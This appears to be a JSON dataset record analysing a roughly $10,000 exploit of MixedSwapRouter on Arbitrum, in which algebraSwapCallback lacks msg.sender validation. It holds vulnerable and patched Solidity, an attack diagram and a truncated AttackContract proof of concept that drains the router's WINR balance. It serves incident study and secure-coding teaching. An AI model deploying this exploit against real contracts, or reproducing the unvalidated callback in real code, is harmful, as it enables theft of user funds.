@@ -1,0 +1,30 @@
+{
+ "id": "2024__2024-05-XX_MixedSwapRouter_AlgebraSwapCallbackValidation",
+ "source_file": "2024/2024-05-XX_MixedSwapRouter_AlgebraSwapCallbackValidation.md",
+ "title": "MixedSwapRouter — algebraSwapCallback Caller Validation Missing Analysis",
+ "date": "2024-05-01",
+ "protocol": "MixedSwapRouter",
+ "chain": "Arbitrum",
+ "loss_raw": "~$10,000",
+ "loss_usd": 10000.0,
+ "root_cause": "The `algebraSwapCallback()` function does not validate `msg.sender`, allowing an attacker to call the callback directly and transfer tokens held by the router to an arbitrary address",
+ "attack_tx": null,
+ "vulnerable_contract": "MixedSwapRouter (Arbitrum)",
+ "classes": [
+  "unprotected-callback"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no caller validation on algebraSwapCallback\ncontract MixedSwapRouter {\n    // Callback invoked by the Algebra pool after a swap\n    function algebraSwapCallback(\n        int256 amount0Delta,\n        int256 amount1Delta,\n        bytes calldata data\n    ) external {\n        // No msg.sender validation — anyone can call directly\n        (address tokenIn, address payer) = abi.decode(data, (address, address));\n        if (amount0Delta > 0) {\n            // Transfers tokenIn to msg.sender (address specified by attacker)\n            IERC20(tokenIn).transfer(msg.sender, uint256(amount0Delta));\n        }\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Safe code: validates that caller is a legitimate Algebra pool\nfunction algebraSwapCallback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata data\n) external {\n    // Verify msg.sender is a pool registered in the factory\n    require(\n        IAlgebraFactory(factory).poolByPair(token0, token1) == msg.sender,\n        \"callback not from pool\"\n    );\n    // ...\n}"
+ ],
+ "steps": [
+  "→ [1] MixedSwapRouter.algebraSwapCallback(",
+  "→ [2] ~$10K worth of WINR drained"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] MixedSwapRouter.algebraSwapCallback(\n  │         amount0Delta = routerWINRBalance,\n  │         amount1Delta = 0,\n  │         data = abi.encode(WINR, attacker)\n  │       )\n  │         └─ No msg.sender validation\n  │         └─ WINR.transfer(attacker, routerBalance)\n  │\n  └─→ [2] ~$10K worth of WINR drained",
+  "interface IMixedSwapRouter {\n    function algebraSwapCallback(\n        int256 amount0Delta,\n        int256 amount1Delta,\n        bytes calldata data\n    ) external;\n}\n\ncontract AttackContract {\n    IMixedSwapRouter constant router = IMixedSwapRouter(/* MixedSwapRouter */);\n    address          constant WINR   = /* WINR token on Arbitrum */;\n\n    function testExploit() external {\n        uint256 routerBalance = IERC20(WINR).balanceOf(address(router));\n\n        // Call algebraSwapCallback directly (no caller validation)\n        router.algebraSwapCallback(\n            int256(routerBalance),  // amount0Delta: full WINR balance held by router\n            0,\n            abi.encode(WINR, address(this))  // tokenIn, payer\n        );\n        // WINR.transfer(msg.sender(=attacker), routerBalance) ex"
+ ]
+}
